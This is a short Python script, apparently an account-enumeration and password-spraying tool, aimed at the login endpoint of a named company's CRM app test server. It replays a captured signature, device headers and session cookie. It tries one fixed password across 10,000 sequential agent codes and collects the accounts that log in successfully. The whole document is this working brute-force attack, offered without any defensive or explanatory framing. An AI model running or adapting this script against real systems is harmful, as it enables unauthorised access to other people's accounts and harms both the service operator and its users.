import requests,json

url = 'https://crmapp-sit.tianan-life.com/account/login'
parm1 = 'apiVersion=1.0&session=&agentCode='
parm2 = '&sign=fa5e7e94d02d231e31c61df124aa28e71aea3002031595bd9794872855b3be19&reqTime=1575625647273&pwd=tianan123&signNonce=14e0f9f1-da85-4714-9e46-cc7cc639cc54&deviceId=867367030451194'
header = {'Content-Type': 'application/x-www-form-urlencoded',
          'User-Agent': 'okhttp/3.12.0',
          'x-device-id': '867367030451194',
          'x-os-type': 'android',
          'x-os-ver':'27',
          'x-app-ver': '2.1.2',
          'cookie': 'JSESSIONID=6D3C472AB220297AFB0490F5ACB4C335',
          'Host': 'crmapp-sit.tianan-life.com'}
list = 0
code = []
for i in range(390000000,390010000):
    r = requests.post(url=url,data=parm1+str(i)+parm2,headers=header)
    json = r.json()
    if json['code'] == 'OK':
        code.append(json['data']['agentCode'])
        list +=1
print(list, code)